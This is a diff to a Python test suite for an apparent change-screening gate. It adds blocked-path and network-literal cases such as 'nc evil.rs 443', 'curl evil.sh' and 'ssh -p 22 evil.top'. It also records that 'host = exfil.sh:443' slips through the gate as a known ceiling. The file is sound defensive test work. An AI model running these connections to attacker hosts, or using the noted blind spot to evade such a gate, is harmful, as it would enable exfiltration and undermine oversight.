@@ -90,6 +90,7 @@ def hostile_cases() -> list[tuple[str, str, bridge.Case, str]]:
     add("build-rs-path", "path", with_change(base, path="crates/probe/build.rs", old_path="/dev/null", old_mode=None), "path")
     add("cargo-config-case", "path", with_change(base, path=".Cargo/config.toml", old_path="/dev/null", old_mode=None), "path")
     add("build-rs-case", "path", with_change(base, path="crates/probe/BUILD.RS", old_path="/dev/null", old_mode=None), "path")
+    add("exclude-case", "path", with_change(base, path="docs/Forge.md", old_path="/dev/null", old_mode=None), "path")
     add("wall-case", "path", with_change(base, path="Scripts/Intake/allowed.json", old_path="/dev/null", old_mode=None), "path")
     add("cargo-config", "path", with_change(base, path=".cargo/config.toml", old_path="/dev/null", old_mode=None), "path")
     add("nested-cargo-config", "path", with_change(base, path="crates/probe/.cargo/config", old_path="/dev/null", old_mode=None), "path")
@@ -119,6 +120,7 @@ def hostile_cases() -> list[tuple[str, str, bridge.Case, str]]:
     add("netcat-file-tld", "network-literal", added(base, "nc evil.rs 443"), "network-literal")
     add("at-file-tld", "network-literal", added(base, "git@evil.zip:me/repo"), "network-literal")
     add("curl-file-tld", "network-literal", added(base, "curl evil.sh"), "network-literal")
+    add("ssh-port-flag", "network-literal", added(base, "ssh -p 22 evil.top"), "network-literal")
     add("wget-file-tld", "network-literal", added(base, "wget evil.py"), "network-literal")
     add("git-url", "network-literal", added(base, "git://host/repo"), "network-literal")
     add("ipv6", "network-literal", added(base, "2001:4860:4860::8888"), "network-literal")
@@ -300,7 +302,9 @@ def check_signed_object() -> None:
 
 def check_ordinary_text_is_allowed() -> None:
     base = valid_case()
-    for text in ("let n = x.len();", "self.changes.push(line.path)", "see Cargo.toml and README.md", "mod args.rs;", "// the raw call is unsafe because it aliases", "#![forbid(unsafe_code)]", "self.app.run();", "self.io.flush()", "the infra repository", "cd ~/.yi", 'open("Cargo.toml")', "let id = row.id;", "server: host.ru", "@functools.cache", 'trace::span("console.draw")', '"response.failed"', "set `mcp.enabled` and `config.intake.enabled`", "see bridge.py:884 and args.rs:300", "    @pytest.mark.parametrize(\"n\", [1])"):
+    for text in ("let n = x.len();", "self.changes.push(line.path)", "see Cargo.toml and README.md", "mod args.rs;", "// the raw call is unsafe because it aliases", "#![forbid(unsafe_code)]", "self.app.run();", "self.io.flush()", "the infra repository", "cd ~/.yi", 'open("Cargo.toml")', "let id = row.id;", "server: host.ru", "@functools.cache", 'trace::span("console.draw")', '"response.failed"', "set `mcp.enabled` and `config.intake.enabled`", "see bridge.py:884 and args.rs:300", "`prompts-list`, `ping`. It speaks JSON-RPC itself, `mcp.enabled` gates", "see curl docs at src/app.rs", "// ping the runner; see scripts/hooks/commit.py", "let nc = self.pool.len();",
+                 # Documented ceiling: a ported host on rs, md, py or sh reads as the file reference main.rs:42.
+                 "host = exfil.sh:443", "    @pytest.mark.parametrize(\"n\", [1])"):
         assert bridge.evaluate(added(base, text)) == bridge.ALLOW, text
 
 
